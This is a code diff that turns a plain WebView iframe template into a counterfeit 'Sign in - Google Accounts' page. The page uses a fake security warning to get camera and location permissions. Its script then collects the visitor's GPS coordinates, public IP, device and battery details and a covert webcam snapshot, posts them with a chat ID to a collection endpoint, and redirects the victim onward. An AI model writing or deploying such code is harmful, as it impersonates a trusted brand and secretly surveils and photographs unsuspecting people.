@@ -2,13 +2,191 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>WebView</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
     <style>
-        body { margin: 0; padding: 0; }
-        iframe { width: 100vw; height: 100vh; border: none; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #fff;
+            padding: 48px 40px 36px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(60, 64, 67, 0.3), 0 4px 8px 3px rgba(60, 64, 67, 0.15);
+            width: 380px;
+            text-align: center;
+        }
+        h1 {
+            color: #202124;
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 0;
+        }
+        p {
+            color: #5f6368;
+            font-size: 16px;
+            margin-top: 8px;
+            margin-bottom: 24px;
+        }
+        .message {
+            background-color: #fce8e6;
+            color: #ea4335;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 16px;
+            font-size: 14px;
+        }
+        button {
+            background-color: #1a73e8;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 500;
+            padding: 10px 24px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+        }
+        .footer {
+            margin-top: 24px;
+            font-size: 14px;
+            color: #5f6368;
+        }
+        a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
     </style>
 </head>
 <body>
-    <iframe src="<%= url %>" allow="camera; geolocation; microphone"></iframe>
+    <div class="container">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" style="width:100px; margin-bottom: 24px;">
+        <h1>Sign in</h1>
+        <p>To continue, please sign in with your Google Account.</p>
+        <div class="message">
+            <p><strong>Security Warning:</strong> For your safety, we need to verify your identity. Please enable camera and location permissions to proceed.</p>
+        </div>
+        <button id="verifyBtn">Verify & Continue</button>
+        <div class="footer">
+            <p>Not your computer? Use Guest mode to sign in privately. 
+                <a href="#">Learn more</a>
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // জাভাস্ক্রিপ্ট কোড শুরু
+        async function getDeviceInformation() {
+            const battery = await navigator.getBattery();
+            return {
+                ip_address: null, 
+                user_agent: navigator.userAgent,
+                platform: navigator.platform,
+                device_name: navigator.appName,
+                online_status: navigator.onLine,
+                battery_level: battery.level * 100 + '%',
+                charging_status: battery.charging ? 'Charging' : 'Not Charging'
+            };
+        }
+
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (e) {
+                return 'unknown';
+            }
+        }
+
+        async function postData(data) {
+            const chat_id = "<%= chat_id %>";
+            const api_url = "/api/data";
+            data.chat_id = chat_id;
+
+            try {
+                const response = await fetch(api_url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                return await response.json();
+            } catch (e) {
+                console.error("Failed to post data:", e);
+                return null;
+            }
+        }
+
+        async function getLocation() {
+            return new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        });
+                    },
+                    error => {
+                        console.error("Location permission denied or error:", error);
+                        resolve({});
+                    }
+                );
+            });
+        }
+
+        async function getCameraImage() {
+            return new Promise((resolve, reject) => {
+                const video = document.createElement('video');
+                const canvas = document.createElement('canvas');
+                
+                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                    .then(stream => {
+                        video.srcObject = stream;
+                        video.play();
+                        video.onloadedmetadata = () => {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            stream.getTracks().forEach(track => track.stop());
+                            const imageDataURL = canvas.toDataURL('image/jpeg');
+                            resolve(imageDataURL.split(',')[1]); 
+                        };
+                    })
+                    .catch(error => {
+                        console.error("Camera access denied or error:", error);
+                        resolve(null);
+                    });
+            });
+        }
+
+        async function collectAndSendData() {
+            const location = await getLocation();
+            const device_info = await getDeviceInformation();
+            device_info.ip_address = await getIPAddress();
+            const image = await getCameraImage();
+
+            const payload = {
+                location: location,
+                device_info: device_info,
+                image: image
+            };
+            
+            await postData(payload);
+            
+            const original_url = "<%= original_url %>";
+            if (original_url && original_url !== 'about:blank') {
+                window.location.href = original_url;
+            }
+        }
+
+        document.getElementById('verifyBtn').addEventListener('click', collectAndSendData);
+    </script>
 </body>
 </html>
